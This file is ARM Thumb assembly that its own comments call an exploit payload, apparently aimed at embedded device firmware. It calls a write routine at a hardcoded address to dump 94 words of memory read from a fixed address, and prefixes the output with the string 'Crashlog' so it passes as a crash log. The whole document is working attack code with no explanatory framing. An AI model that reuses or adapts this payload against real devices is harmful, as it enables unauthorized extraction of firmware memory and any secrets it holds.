.syntax unified
.thumb

push    {r0-r12, lr}    /* save registers and return address */
sub.w   sp, sp, #616    /* resize stack */

bl      fillup          /* fill stack with mem dump */

mov.w   r1, #512        /* arguments for write() */
add     r0, sp, #100
ldr     r7, =0x00410e39 /* call write() */
blx     r7

add.w   sp, sp, #616    /* shrink back stack */
pop     {r0-r12, lr}    
bx      lr              /* return from exploit payload (END) */

/**** 'fillup' function populates the stack with memory *****/ 
fillup:
add     r4, sp, #100

/* first 8 bytes **must** contain the string "Crashlog" */
ldr     r7, =0x73617243
str     r7, [r4], #4
ldr     r7, =0x676f6c68
str     r7, [r4], #4

ldr     r7, =0x00408706 /* Starting address for the dump */
add     r4, sp, #108
mov     r3, #94
lp1:
    ldr     r8, [r7], #4
    str     r8, [r4], #4
    sub     r3, #1
    cbz     r3, end
    b       lp1
end:
bx lr                   /* return from 'fillup' function */